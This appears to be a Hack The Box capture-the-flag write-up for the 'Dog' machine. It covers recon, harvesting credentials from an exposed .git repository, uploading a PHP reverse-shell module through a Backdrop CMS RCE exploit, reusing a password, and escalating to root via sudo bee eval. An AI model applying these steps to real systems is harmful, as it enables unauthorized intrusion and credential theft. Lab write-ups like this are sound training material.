---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - Linux
  - Backdrop
  - Githack
  - GitDump
  - Regex
---
# Overview

| Name            | Dog          |
| --------------- | ------------ |
| OS              | Linux        |
| Base Points     | Easy [20]    |
| Status          | Done         |

---
# Recon
## Nmap

```bash
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE    SERVICE VERSION
22/tcp  open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp  open     http    Apache httpd 2.4.41 ((Ubuntu))
| http-git: 
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
|_http-title: Home | Dog
524/tcp filtered ncp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Enumeration

```bash

╭─[~]─[at0m@heker]─[0]─[4236]
╰─[:)] % gobuster dir -u http://10.10.11.58/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.58/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.git/HEAD            (Status: 200) [Size: 23]
/.git                 (Status: 301) [Size: 309] [--> http://10.10.11.58/.git/]
/.git/config          (Status: 200) [Size: 92]
/.git/logs/           (Status: 200) [Size: 1130]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.git/index           (Status: 200) [Size: 344667]
/core                 (Status: 301) [Size: 309] [--> http://10.10.11.58/core/]
/files                (Status: 301) [Size: 310] [--> http://10.10.11.58/files/]
/index.php            (Status: 200) [Size: 13332]
/layouts              (Status: 301) [Size: 312] [--> http://10.10.11.58/layouts/]
/modules              (Status: 301) [Size: 312] [--> http://10.10.11.58/modules/]
/robots.txt           (Status: 200) [Size: 1198]
/server-status        (Status: 403) [Size: 276]
/sites                (Status: 301) [Size: 310] [--> http://10.10.11.58/sites/]
/themes               (Status: 301) [Size: 311] [--> http://10.10.11.58/themes/]
Progress: 4744 / 4745 (99.98%)
===============================================================
Finished
===============================================================
```
### Dump the `.git` using GitHack

```bash
# Use regex to find usename which is in email format as we didn't find any username so we go for emails
grep -rEo "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" .

tiffany@dog.htb

#We find password at 
settings.php
BackDropJ2024DS2024
```

- Now we login with the credentials in the website.
# Exploitaion

- Go to `Functionality` > `Install new modules` > `Manual installation`
- And we are asked to upload compressed file so we will make the compressed file with `php` shell.

```bash
[~/Downloads/CTFS/htb/dog]
└─$ searchsploit Backdrop
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
Backdrop CMS 1.20.0 - 'Multiple' Cross-Site Request Forgery (CSRF)               | php/webapps/50323.html
Backdrop CMS 1.23.0 - Stored XSS                                                 | php/webapps/51905.txt
Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE)               | php/webapps/52021.py
Backdrop Cms v1.25.1 - Stored Cross-Site Scripting (XSS)                         | php/webapps/51597.txt
--------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

┌──(void)─(At0m㉿At0m)-[~/Downloads/CTFS/htb/dog]
└─$ searchsploit -m 52021
It will give us a python exploit 
┌──(void)─(At0m㉿At0m)-[~/Downloads/CTFS/htb/dog]
└─$ python 52021.py http://localhost:8888
```

- This will give a `shell` folder .

```bash
┌──(void)─(At0m㉿At0m)-[~/…/CTFS/htb/dog/shell]
└─$ ls
shell.info  shell.php  shell
```

- We need info file because we will get error if we don’t and its better if we have another shell folder inside the main folder with script and copy the scripts with in it and compress the main folder using `tar` format.

- Now upload it.

- Shell upload and execute. 

```bash
┌──(void)─(At0m㉿At0m)-[~/Downloads/CTFS/htb/dog]
└─$ nc -nlvp 9001
```

- Visit `http://10.129.190.61/modules/shell/shell.php`
# Post Exploitation
## User

```bash
╭─[~]─[at0m@heker]─[0]─[5387]
╰─[:)] % nc -lvnp 9001 
Connection from 10.10.11.58:45438
SOCKET: Shell has connected! PID: 8712
$ python3 -c 'import pty; pty.spawn("/bin/bash")'

www-data@dog:/home$ ls
jobert  johncusack
www-data@dog:/home$ su johncusack
Password: BackDropJ2024DS2024
johncusack@dog:/home$ cd johncusack/
johncusack@dog:~$ ls
user.txt
johncusack@dog:~$ cat user.txt 
# User.txt
```
# Privilege Escalation
## Root

```bash
johncusack@dog:~$ sudo -l
[sudo] password for johncusack: 
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
johncusack@dog:~$ cd /usr/local/bin
johncusack@dog:/usr/local/bin$ ./bee
🐝 Bee
Usage: bee [global-options] <command> [options] [arguments]

johncusack@dog:/usr/local/bin$ sudo bee --root=/var/www/html/ eval 'system("cat /root/root.txt");'
# Root Flag
```

- We can find Escalation of different tools from here [GTFOBins](https://gtfobins.github.io/)

---



